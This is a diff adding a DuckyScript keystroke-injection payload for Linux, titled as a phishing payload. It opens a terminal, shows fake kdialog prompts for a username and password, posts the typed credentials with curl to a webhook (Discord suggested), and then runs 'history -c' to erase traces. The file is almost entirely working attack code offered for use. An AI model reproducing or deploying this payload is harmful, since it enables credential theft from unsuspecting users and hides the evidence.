@@ -1,0 +1,54 @@
+
+REM ##########################################################
+REM #                                                        |
+REM # Title        : Standard Phishing Payload Using kdialog |
+REM # Author       : Aleff                                   |
+REM # Version      : 1.0                                     |
+REM # Category     : Phishing                                |
+REM # Target       : Linux                                   |
+REM #                                                        |
+REM ##########################################################
+
+REM Requirements:
+REM     - EXFILTRATION:
+REM         - Internet Connection
+REM         - Discord webhook for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Dropbox, Telegram and so on..)
+REM     - PHISHING:
+REM         - This payload is usable on the Linux system where is installed 'kdialog', but you can use whatever you want for simulate the popup with the intent to take the input
+REM         - It is important that the popup payload occurs in a single line so that the traces of data collection are eliminated immediately after submission. This is precisely why you can see the REMed code to get a good understanding of what it is all about.
+
+REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
+DEFINE WEBHOOK example.com
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+
+REM #### Phishing ####
+
+
+STRING WEBHOOK_URL="
+STRING WEBHOOK
+STRING "
+ENTER
+DELAY 500
+
+
+REM A short and efficient cURL command to send an HTTP POST request to a webhook URL with JSON data in the request body.
+STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(
+
+REM A compact command that uses kdialog to display a popup message prompting (into the curl content section) the user to enter their username and password to proceed. You can't acquire multiple input in one popup, so you should use multiple popup, as i wrote here.
+REM You can set the title, the message, the input type and so and so on...
+STRING kdialog --title "Popup Title" --msgbox "Insert your username and password for go on"; 
+STRING kdialog --title "Insert your Username" --inputbox "Username"; 
+STRING kdialog --title "Insert your Password" --password "Password" --default "password";
+
+REM The end part of the curl payload...
+STRING )\"}" $WEBHOOK_URL); 
+
+REM history -c will clear the last shell history and the exit command will close the popup at the end of the execution
+STRING history -c; exit;
+
+REM All-In-One doesn't need delay time
+ENTER
